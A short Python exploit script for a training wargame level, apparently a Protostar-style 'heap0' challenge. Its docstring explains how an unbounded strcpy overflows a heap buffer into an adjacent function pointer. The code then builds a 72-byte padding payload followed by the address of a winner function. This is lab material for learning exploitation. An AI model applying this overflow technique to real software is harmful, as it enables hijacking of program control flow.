#!/usr/bin/env python3
"""
ex10 exploit  (heap0: overflow a heap buffer into an adjacent function pointer).

main(argv):
    a = malloc(0x40);           // data buffer         (chunk A)
    b = malloc(4);              // holds a function ptr (chunk B, right after A)
    *b = nowinner;              // 0x08048478
    printf("data is at %p, fp is at %p\n", a, b);
    strcpy(a, argv[1]);         // <-- unbounded heap overflow
    (*(void(**)())b)();         // call *(*b)   <-- we hijack this

winner() @ 0x08048464 -> puts("level passed").

The two allocations are adjacent on the heap. strcpy has no bound, so overflowing
`a` overwrites the function pointer stored in `b`. Distance a -> b = 0x48 = 72
bytes (malloc(0x40) chunk = 0x48 incl. header), confirmed by the program's own
leak ("data is at 0x..008, fp is at 0x..050"). This offset is RELATIVE, so the
exploit is independent of heap ASLR; winner's address is fixed (no PIE).

Overwrite the pointer with &winner so `call *(*b)` runs winner().

Usage (VM):   /opt/hole-in-bin/ex10/bin "$(python3 ex10.py)"
Local:        scripts/runlocal.sh challenges/ex10/bin "$(python3 scripts/ex10.py)"
"""
import struct
import sys

OFFSET = 72                 # a -> b
WINNER = 0x08048464
payload = b"A" * OFFSET + struct.pack("<I", WINNER)
sys.stdout.buffer.write(payload)
